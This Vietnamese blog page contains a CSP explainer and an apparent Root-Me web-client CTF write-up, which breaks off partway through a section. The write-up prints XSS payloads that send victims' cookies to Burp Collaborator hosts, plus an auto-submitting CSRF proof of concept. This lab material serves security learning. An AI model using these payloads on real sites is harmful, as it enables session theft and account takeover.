<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Hexo">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 4.2.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-csp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/csp/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/csp/">Content Security Policy</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:heading -->
<h2><strong>Content&nbsp;Security&nbsp;Policy&nbsp;(CSP)&nbsp;là&nbsp;gì&nbsp;?</strong>&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Content Security Policy (CSP) là chính sách bảo mật nội dung, được sử dụng để xác định các nguồn nội dung an toàn trên website mà trình duyệt có thể tải về cho người dùng.CSP là biện pháp đối phó rất hiệu quả với các cuộc tấn công Cross Site Scripting (XSS) và các kiểu injection tương tự.</p>
<!-- /wp:paragraph -->

<!-- wp:image -->
<figure class="wp-block-image"><img src="https://datahouse.asia/wp-content/uploads/2020/04/content-security-policy-1024x414.png" alt="Does Security Matter to Front End Developers and Tips To Not Get ..."/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Tưởng tượng một chút, chúng ta ó 2 hướng cho các cuộc tấn công chèn script độc hại vào các website, đó là thông qua:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Inline Script: attacker đặt script của chúng trực tiếp vào trang web của bạn</li><li>Trình duyệt sẽ Load script từ các domain khác (của attacker) trên website đang truy cập .</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Với hướng thứ 2,  attacker ưa dùng hơn vì dễ dàng truền tải script độc hại và có thể tùy ý thay đổi nội dung của script mà trình duyệt load. Nó có thể thay đổi trang web mà không cần tương tác.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":316,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image-5.png" alt="" class="wp-image-316"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Nhiệm vụ của CSP lúc này là không cho phép trình duyệt load script từ domain khác ,như thế kế hoạch của attacker sẽ bị hỏng. Vậy CSP đã làm thế nào ? </p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2><strong>Cách&nbsp;hoạt&nbsp;động&nbsp;của&nbsp;SCP</strong>&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Bằng cách sử dụng các chỉ thị của CSP phù hợp ở trong các tiêu đề phản hồi HTTP, bạn có thể chọn lọc, chỉ định nguồn dữ liệu nào sẽ được phép sử dụng trong ứng dụng web của mình. Ví dụ như:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>Chỉ định thực thi script đến từ domain của mình (ví dụ: mydomain.com)</li><li>Chỉ định thực thi các script đến từ một domain khác đáng tin cậy hay subdomain (ví dụ: * .mydomain.com, google.com)</li><li>Chỉ định chỉ thực thi tệp duy nhất mydomain.com/script.min.js</li><li>Không thực thi bất kì mã JavaScript nào</li><li>Chỉ hiển thị hình ảnh đến từ cdn.securecdn.com</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Cách chỉ định chính sách , đó là thêm header HTTP dưới đây vào repsonse , nó có dạng là</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Content-Security-Policy: [chinh sách]</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":311,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image-2.png" alt="" class="wp-image-311"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Để&nbsp;viết&nbsp;chính&nbsp;sách,&nbsp;bạn&nbsp;cần&nbsp;biết&nbsp;các&nbsp;chỉ&nbsp;thị&nbsp;cho&nbsp;các&nbsp;đối&nbsp;tượng&nbsp;&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":312,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image-3.png" alt="" class="wp-image-312"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ví dụ như img-src áp dụng các hình ảnh được hiển thị trên trang web, nó sẽ chỉ định nguồn hình ảnh đươc phép lấy về, default-src đóng vai trò dự phòng để tìm nạp CSP khác nếu nó bị thiếu . Để biết thêm và chi tiết các chỉ thị các bạn có thể tham khảo nội <a rel="noreferrer noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank">ở đây</a>  .</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Cùng với các chị thị còn có các thuộc tính của các chỉ thị hoặc có thể gọi là các keywords/values bổ trợ, Ví dụ như :</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li>"none" không cho phép các đối tượng liên quan đến chỉ thị được thực thi.</li><li>"self " cho phép thực thi đối với domain của bạn (ko tính subdomain) hoặc những domain được chỉ định.</li><li>"unsafe-inline" cho phép thực thi các đoạn mã CSS hoặc Javascript được nhúng trực tiếp vào mã nguồn. Thiết lập này không được khuyến khích sử dụng nhưng trong nhiều trường hợp chúng ta vẫn phải dùng đến.</li><li>"unsafe-eval" cho phép chạy hàm eval(), đây là một hàm khá nguy hiểm của Javascript.</li><li>"*" áp dụng cho tất cả ví dụ như 'Https: // *' sẽ cho phép tất cả các tài nguyên đang truyền tải qua HTTPS.</li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Bạn&nbsp;có&nbsp;thể&nbsp;tham&nbsp;khảo&nbsp;thêm&nbsp;<a rel="noreferrer noopener" href="https://content-security-policy.com/" target="_blank">ở đây</a>&nbsp;</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3><strong>VÍ DỤ MỘT VÀI CHÍNH SÁCH</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>&nbsp;CSP chỉ cho phép JavaScript , cái mà được lưu trữ trong trang web của bạn</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Content-Security-Policy: script-src 'self'</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Cho phép các các nội dung thuộc domain và subdomain của example.com và được truyền tải thông qua cả 2 giao thức http , https</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Content-Security-Policy: default-src *://*.example.com  </code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Chỉ cho phép JavaScript , cái mà được lưu trữ trên trang web của bạn và cdn.trustyorigin.net nhưng hình ảnh thì ở bất kì chỗ nào</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Content-Security-Policy: script-src 'self' cdn.trustedorigin.net; img-src *; </code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Chặn tất cả các form submit</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Content-Security-Policy form-action 'none'; </code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Chỉ cho phép thực thi js trong tập tin script.js trên https://trustyorigin.net/ và mặc định các giá trị của child-src, connect-src, font-src, frame-src, img-src, manifest-src, media-src, media-src, object-src, script-src, style-src và worker-src đều là self - các nội dung liên quan đến chỉ thị đều lấy từ nguồn của URL hiện tại</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>Content-Security-Policy default-src ‘self’; script-src https://trustedorigin.net/script.js; </code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2><strong>Triển&nbsp;khai&nbsp;CSP</strong>&nbsp;</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Để triển khai CSP, ta cần định cấu hình máy chủ web của mình để trả về Content-Security-Policy header HTTP (đôi khi bạn sẽ thấy nó với header X-Content-Security-Policytiêu đề, nhưng đó là phiên bản cũ hơn và bây giờ không cần đề cập đến nó nữa). Ví dụ: nếu bạn sử dụng Apache, bạn có thể xác định CSP trong tệp httpd.conf , Virtualhost hoặc .htaccess của trang web của bạn.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":313,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image-4.png" alt="" class="wp-image-313"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ngày nay ,CSP cũng được hỗ trợ bởi tất cả các trình duyệt hiện đại  và đã được nhiều năm chỉ riêng không được hỗ trợ trong Internet Explorer, nó chỉ dùng sandbox.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":319,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2020/05/image-6.png" alt="" class="wp-image-319"/><figcaption>Level ở đây các bạn có thể hiểu như là thế hệ của CSP</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ngoài ra cấu hình trên server, bạn cũng có thể cung cấp các chỉ thị cụ thể bằng cách sử dụng thẻ &lt;meta&gt;- thẻ HTML , được gọi là CSP Page-level. Dưới đây, một ví dụ đặt ra chính sách tương tự như trên:</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code>&lt;meta http-equiv="Content-Security-Policy" content="default-src 'self' "> </code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Để sử dụng các chỉ thị này sẽ cần đến Sanboxing của trình duyệt</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Một vấn đề nữa, nếu như các trình duyệt không hỗ trợ CSP nó vẫn hoạt động với các máy chủ triển khai nó và ngược lại, các trình duyệt không hỗ trợ CSP chỉ cần bỏ qua nó, hoạt động như bình thường, và mặc định Same-origin là policy cho nội dung web. Nếu trang web không cung cấp CSP header , các trình duyệt cũng sử dụng Same-origin làm policy .</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Bypass CSP</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Có lẽ đây là mục mà ae pentest yêu thích nhất, bất kì phương thức bảo mật nào đều có lỗ hổng và CSP cũng không ngoại lệ. CSP giống như whitelist, vì vậy đôi lúc nó sẽ khổng thể đáp ứng được toàn bộ ưu cầu về các tính bảo mật. Các bạn có thểm tham khảo các bài viết dưới đây :</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><li><a href="http://blog.innerht.ml/csp-2015/" target="_blank" rel="noopener">"CSP 2015". XSS&nbsp;Jigsaw.&nbsp;Retrieved&nbsp;December&nbsp;12, 2015.&nbsp;</a></li><li><a href="http://sebastian-lekies.de/csp/bypasses.php" target="_blank" rel="noopener">Lekies,&nbsp;Sebastian. "Collection&nbsp;of&nbsp;CSP&nbsp;bypasses".&nbsp;Retrieved&nbsp;2017-06-05.&nbsp;</a></li><li><a href="http://www.slideshare.net/x00mario/an-abusive-relationship-with-angularjs" target="_blank" rel="noopener">"An&nbsp;Abusive&nbsp;Relationship&nbsp;with&nbsp;AngularJS".&nbsp;Retrieved&nbsp;January&nbsp;5, 2016.&nbsp;</a></li><li><a href="https://www.youtube.com/watch?v=p07acPBi-qw" target="_blank" rel="noopener">OWASP (2017-05-25),&nbsp;AppSec&nbsp;EU 2017&nbsp;Don't&nbsp;Trust&nbsp;The DOM:&nbsp;Bypassing&nbsp;XSS&nbsp;Mitigations&nbsp;Via&nbsp;Script&nbsp;Gadgets&nbsp;by&nbsp;Sebastian&nbsp;Lekies,&nbsp;retrieved&nbsp;2017-06-05&nbsp;</a></li><li><a rel="noreferrer noopener" href="https://portswigger.net/research/bypassing-csp-with-policy-injection" target="_blank">https://portswigger.net/research/bypassing-csp-with-policy-injection</a>&nbsp;</li><li><a rel="noreferrer noopener" href="https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/" target="_blank">https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/</a>&nbsp;</li><li><a href="https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass" target="_blank" rel="noopener">https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass</a></li></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>Ngay từ đầu mk cũng đề cập , CSP giúp giảm thiểu các cuộc tấn công xss và các kiểu tấn công tương tự nhưng nó lại không có tác dụng một người ae họ hàng gần với nó là HTML injection.  Bạn có thể tham khảo chi tiết <a rel="noreferrer noopener" href="https://blog.detectify.com/2019/07/11/content-security-policy-csp-explained-including-common-bypasses/" target="_blank">ở đây</a>  và xem bài thuyết trình về CSP (Tóm tắt một chút cho các bạn đó là anh Matt Brunt đã trình bày các khái niệm, mối đe dọa từ xss, triển khai CSP một cách hợp lí để vừa ngăn ngừa tấn công vừa tránh bị phá hỏng web site bởi chính CSP, và cuối cùng đó là các vấn đề và sự hữu ích của tính  năng auto report của CSP - "report-only" cho các quản trị). OK cùng xem nào ! và hẹn các bạn ở bài viết sau.</p>
<!-- /wp:paragraph -->

<!-- wp:core-embed/youtube {"url":"https://www.youtube.com/watch?v=mr230uotw-Y","type":"video","providerNameSlug":"youtube","className":"wp-embed-aspect-16-9 wp-has-aspect-ratio"} -->
<figure class="wp-block-embed-youtube wp-block-embed is-type-video is-provider-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
https://www.youtube.com/watch?v=mr230uotw-Y
</div></figure>
<!-- /wp:core-embed/youtube -->

<!-- wp:heading -->
<h2>Tham khảo</h2>
<!-- /wp:heading -->

<!-- wp:list -->
<ul><li><a href="https://en.wikipedia.org/wiki/Content_Security_Policy" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Content_Security_Policy</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></li><li><a href="https://w3c.github.io/webappsec-csp/#framework" target="_blank" rel="noopener">https://w3c.github.io/webappsec-csp/#framework</a><a href="https://www.netsparker.com/blog/web-security/content-security-policy/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/content-security-policy/</a></li><li><a href="https://blog.sucuri.net/2018/04/content-security-policy.html" target="_blank" rel="noopener">https://blog.sucuri.net/2018/04/content-security-policy.html</a></li><li><a href="https://content-security-policy.com/" target="_blank" rel="noopener">https://content-security-policy.com/</a></li></ul>
<!-- /wp:list -->
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/06/14/csp/" data-id="ckbgpmbcr000mqxjm3r0e5dh3" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Technology/" rel="tag">Technology</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-WEB-CLIENT" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/06/14/WEB-CLIENT/" class="article-date">
  <time datetime="2020-06-14T07:00:00.000Z" itemprop="datePublished">2020-06-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/06/14/WEB-CLIENT/">RooMe (Web-client)</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <!-- wp:image -->
<figure class="wp-block-image"><img src="https://miro.medium.com/max/1424/1*joz9hfPQ-osvbLiUqfakmg.png" alt=""/><figcaption><br><strong>Write-Up</strong></figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>HTML – disabled buttons</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":4} -->
<h4><strong>Resolution</strong></h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Ở đây ta có 2 thẻ html ẩn bị ẩn , inspect (F12 -&gt; Elements) nó ra t sẽ thấy 2 tag bị disabled . </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":8,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-1024x283.png" alt="" class="wp-image-8"/><figcaption>Tag input bị disable bằng thuộc tính "disabled"</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Xóa thuộc tính "disabled" xong là có thể sử dụng được, từ đó submit bất cứ cái gì là sẽ có pass.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":9,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-1.png" alt="" class="wp-image-9"/><figcaption>Pass nhận được (Xin giấu pass )</figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2><code><strong>Javascript - Authentication</strong></code></h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3><strong>Resolution</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>View page source ta sẽ thấy việc xử lí đăng nhập sẽ qua file "login.js" </p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":13,"width":1015,"height":91,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-2-1024x92.png" alt="" class="wp-image-13" width="1015" height="91"/><figcaption>File login.js</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Check file ta thấy luôn được user và password để đăng nhập. Và pass cx để bypass challenge</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":14,"width":797,"height":205,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-3-1024x264.png" alt="" class="wp-image-14" width="797" height="205"/><figcaption>File login.js</figcaption></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>Javascript - Source</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Resolution</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Tương tự như challenge 2 bạn chỉ cần view page soure sẽ thấy password.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Javascript - Authentication 2</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>R<strong>esolution</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Tương tự như challenge 2 bạn chỉ cần view page soure sẽ thấy file login.js . Nhưng ở đâu cần một chút kiến thức về js để lấy được user và password.</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":15,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-4.png" alt="" class="wp-image-15"/><figcaption>File login.js</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Như ta có thể thấy TheLists="GOD:HIDDEN" =&gt; TheLists[i].split(":") =&gt; TheSplit[0] = "GOD" ; TheSplit[1]= "HIDDEN" =&gt; Username, Password.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Javascript - Obfuscation 1</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Resolution</h3>
<!-- /wp:heading -->

<!-- wp:image {"id":19,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-5.png" alt="" class="wp-image-19"/><figcaption>Password bị mã hóa </figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Nhìn qua ta thấy được password được mã hóa bằng URL encode. Sau khi decode ra ta có pass .</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Javascript - Obfuscation 2</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Resolution</h3>
<!-- /wp:heading -->

<!-- wp:image {"id":21,"width":781,"height":100,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large is-resized"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-7-1024x132.png" alt="" class="wp-image-21" width="781" height="100"/><figcaption>Password bị mã hóa</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Ở challeng này password được mã hóa bằng URL encode  + Unescape  + Convert ascii =&gt; String =&gt; Password</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>Javascript - Native code</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Resolution</h3>
<!-- /wp:heading -->

<!-- wp:image {"id":23,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-8-1024x278.png" alt="" class="wp-image-23"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Sử dụng console để decode và tìm ra password</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":25,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-9-1024x210.png" alt="" class="wp-image-25"/></figure>
<!-- /wp:image -->

<!-- wp:heading -->
<h2>Javascript - Obfuscation 3</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>View page source ta thấy đoạn javascript, nhưng để tìm ra pass ta ko cần chú ý đến phần dechiffre() chỉ cần decode phần này:</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>String["fromCharCode"](dechiffre("\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"));</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Chuyển các giá trị hex sang string ta sẽ được chuỗi "55, 56, 54, 79, 115, 69, 114, 116, 107, 49, 50".</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Xong bỏ vô String.fromCharCode(), có thể dùng console là ta có kết quả.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>XSS - Stored 1</h2>
<!-- /wp:heading -->

<!-- wp:image {"id":27,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-10.png" alt="" class="wp-image-27"/><figcaption>Form chat vs admin</figcaption></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Để tạo một xss stored bạn chỉ cần điền payload vào phần message và gửi cho admin rồi chờ đợi cho đến khi admin đọc tin nhắn có chứa mã độc.  </p>
<!-- /wp:paragraph -->

<!-- wp:quote {"className":"is-style-large"} -->
<blockquote class="wp-block-quote is-style-large"><p>&lt;script&gt;document.write("&lt;img src='<a rel="noreferrer noopener" target="_blank" href="https://lg5eofo3qvqmoh7d59iqtkeoxf35ru.burpcollaborator.net/%22+document.cookie+?fbclid=IwAR2Qjw0GL4j5rKbqMfQmAINqFeQ31C4RLfvz1YFiOZsC2G5djg_7ukUkh34">https://lg5eofo3qvqmoh7d59iqtkeoxf35ru.burpcollaborator.net/"+document.cookie+</a>"'&gt;");&lt;/script&gt;</p><cite>Payload  + Burp Collaborator client</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Khi admin đọc tin nhắn script sẽ được thực thi , cookie sẽ được gửi về:</p>
<!-- /wp:paragraph -->

<!-- wp:image {"id":28,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-11.png" alt="" class="wp-image-28"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p>Cookie của Admin dùng để pass challenge này !</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>CSRF - 0 protection</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Resolution</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Sau khi tạo tài khoản và đăng nhập vào profile ta sẽ thấy các mục như contact, profile, private. Trong form profile ta có mục update và vs user bình thường sẽ không thực hiện được bởi chỉ có admin ms có quyền tich vào hộp check "status". Để bypass challenge này cần admin thực hiện update thông tin cho user bằng lỗ hổng csrf.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Sử dụng Burpsuite để bắt request submit Update và generate csrf poc hoặc  copy từ source rồi chỉnh sửa . Thêm vào đó thẻ input với type là "checkbox" , ô checkbox phải được check, mặc định values=”on”. Tạo function attack() sẽ thực  hiện submit update khi load lại trang.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>Csrf poc:</p><cite>&lt;html&gt;<br>&lt;head&gt;<br> &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;<br>&lt;script&gt;<br>function attack() {document.getElementById("csrf").submit()}<br>&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body onload="attack()"&gt;<br>&lt;form id="csrf" action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data"&gt;<br>&lt;input type="text" name="username" value="user"&gt;<br>&lt;input type="checkbox" name="status" value="on" checked&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Bấy giờ post vào comment rồi submit cho admin, chờ  tầm 1 phút rồi vào mục "Private" để nhận pass.</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>XSS - Reflected</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Resolution</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Ta truyền payload vào param "p" và dùng dấu " ' " dể đóng ngoặc bởi dấu phẩy kép bị mã hóa.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>Xss thông qua url</p><cite>http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=%27alert(1)</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":32,"sizeSlug":"large"} -->
<figure class="wp-block-image size-large"><img src="http://hydrasky.ml/wp-content/uploads/2019/12/image-12.png" alt="" class="wp-image-32"/><figcaption>Thử nghiệm Xss thành công</figcaption></figure>
<!-- /wp:image -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><p>Sử dụng burp collaborator client</p><cite>http://challenge01.root-me.org/web-client/ch26/?p=prices%27%20onmouseover=window.location=%27https://ylnjvhj0bm0iuxb6163ydnafu60xom.burpcollaborator.net?%27.concat(document.cookie)%20id=%27</cite></blockquote>
<!-- /wp:quote -->

<!-- wp:paragraph -->
<p>Sau đó report cho Admin và chờ một chút sẽ nhận được flag</p>
<!-- /wp:paragraph -->

<!-- wp:heading -->
<h2>CSRF - token bypass</h2>
<!-- /wp:heading -->

<!-- wp:heading {"level":3} -->
<h3>Resolution</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>Bài này tương tự cài CSRF 0 Protection nhưng khó hơn một chút bởi nó có sử dụng giá trị "forged-token" để ngăn chặn CSRF. Để có thể lừa admin submit như bài trước ta cần phải có token của admin nhưng điều này là không thể ta cần tìm một token  được sinh ra có thể dùng chung user thường vs admin. Trong mục "search" giá trị "forged-token" chúng ta có thể get và bỏ vào request gửi cho admin thực hiện lừa admin  submit một cách hợp lệ với giá trị "forged-token" đó.</p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
